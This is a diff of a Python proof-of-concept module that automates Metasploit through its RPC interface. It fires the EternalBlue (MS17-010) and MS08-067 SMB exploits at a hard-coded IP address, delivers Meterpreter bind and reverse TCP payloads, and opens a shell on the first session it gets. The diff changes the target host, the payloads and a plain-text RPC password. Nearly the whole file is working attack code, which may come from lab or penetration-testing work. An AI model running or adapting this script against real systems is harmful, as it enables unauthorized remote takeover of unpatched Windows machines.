@@ -13,10 +13,14 @@ class poc_module:
             exploit_folder = "NULL"
             return exploit_folder
     def ms17010_poc(self):
-        client = MsfRpcClient('1qaz@WSX', ssl=False)
+        client = MsfRpcClient('XzQLJcrt', port=55552,ssl=False)
         exploit = client.modules.use('exploit','windows/smb/ms17_010_eternalblue')
-        exploit['RHOSTS']  = self.ip
-        exploit.execute(payload='windows/x64/meterpreter/reverse_tcp')
+        exploit['RHOSTS']  = str(self.ip)
+        print(self.ip)
+        exploit.execute(payload='windows/x64/meterpreter/bind_tcp')
+        # exploit.execute(payload="windows/x64/shell/reverse_tcp")
+        
+        # print(result)
         if bool(client.sessions.list):
             session_number = list(client.sessions.list.keys())[0]
             print(session_number)
@@ -30,11 +34,11 @@ class poc_module:
             print("null")
             return "NULL"
     def ms08067_poc(self):
-        client = MsfRpcClient('1qaz@WSX', ssl=False)
+        client = MsfRpcClient('XzQLJcrt', port=55552,ssl=False)
         exploit = client.modules.use('exploit','windows/smb/ms08_067_netapi')
-        exploit['RHOSTS']  = self.ip
-        exploit.execute(payload='windows/meterpreter/reverse_tcp')
-        print("here")
+        exploit['RHOSTS']  = str(self.ip)
+        result = exploit.execute(payload='windows/meterpreter/reverse_tcp')
+        print(result)
         if bool(client.sessions.list):
             session_number = list(client.sessions.list.keys())[0]
             shell = client.sessions.session(session_number)
@@ -48,4 +52,4 @@ class poc_module:
             print("null")
             return "NULL"
 
-print(poc_module("192.168.1.180").ms17010_poc())
+print(poc_module("10.10.174.61").ms17010_poc())
